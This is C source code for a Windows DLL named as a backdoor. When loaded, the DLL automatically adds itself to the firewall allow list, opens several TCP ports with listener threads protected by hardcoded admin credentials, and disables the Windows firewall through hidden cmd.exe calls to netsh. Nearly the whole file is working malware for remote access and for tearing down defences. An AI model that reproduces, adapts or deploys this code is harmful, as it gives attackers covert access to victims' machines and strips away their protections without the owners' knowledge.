#include "main.h"
#include "backdoor.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define USERNAME "admin"
#define PASSWORD "admin4999660"

int gl_Listen_Ports[] = {7437, 74, 43, 37, 743, 437, 17437, 0};

typedef struct _Thread_Param_
{
    char username[100];
    char password[100];
    int port;
} THREAD_PARAM;

DWORD WINAPI listener_thread(LPVOID param)
{
    THREAD_PARAM listenParam = *(THREAD_PARAM *)param;

    free(param);
    start_service(listenParam.username, listenParam.password, listenParam.port);

    return 0;
}

static int _exec_cmd(char *pCmd)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd[2048];

    memset(&si, 0x00, sizeof(si));
    memset(&pi, 0x00, sizeof(pi));
    memset(cmd, 0x00, sizeof(cmd));

    sprintf(cmd, "cmd.exe /c %s", pCmd);

    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    if(CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) != 0)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        return -1;
    }

    return 0;
}

int start_backdoor()
{
    HANDLE hThread = NULL;
    int idx = 0;
    int succCount = 0;
    THREAD_PARAM *pThreadParam = NULL;
    char selfFullPath[MAX_PATH];
    char cmd[1024];

    memset(selfFullPath, 0x00, sizeof(selfFullPath));
    memset(cmd, 0x00, sizeof(cmd));

    if(GetModuleFileName(NULL, selfFullPath, sizeof(selfFullPath) - 1) != 0)
    {
        //添加进程放行名单
        sprintf(cmd, "netsh firewall set allowedprogram \"%s\" A ENABLE", selfFullPath);
        _exec_cmd(cmd);
    }

    for(idx = 0, succCount = 0; gl_Listen_Ports[idx] > 0; ++idx)
    {
        pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
        if(pThreadParam == NULL)
            continue;

        //添加端口放行名单
        memset(cmd, 0x00, sizeof(cmd));
        sprintf(cmd, "netsh firewall set portopening TCP %d ENABLE", gl_Listen_Ports[idx]);
        _exec_cmd(cmd);

        memset(pThreadParam, 0x00, sizeof(THREAD_PARAM));
        strcat(pThreadParam->username, USERNAME);
        strcat(pThreadParam->password, PASSWORD);
        pThreadParam->port = gl_Listen_Ports[idx];

        hThread = CreateThread(NULL, 0, listener_thread, (LPVOID)pThreadParam, 0, NULL);
        CloseHandle(hThread);
        ++succCount;
    }

    //禁用防火墙
    memset(cmd, 0x00, sizeof(cmd));
    strcat(cmd, "netsh firewall set opmode mode=disable");
    _exec_cmd(cmd);

    if(succCount > 0)
    {
        while(1)
        {
            Sleep(100);
        }
    }

    return succCount;
}

extern "C" int DLL_EXPORT main()
{
    return start_backdoor();
}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{


    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // attach to process
        // return FALSE to fail DLL load
        main();
        break;

    case DLL_PROCESS_DETACH:
        // detach from process
        break;

    case DLL_THREAD_ATTACH:
        // attach to thread
        break;

    case DLL_THREAD_DETACH:
        // detach from thread
        break;
    }
    return TRUE; // succesful
}
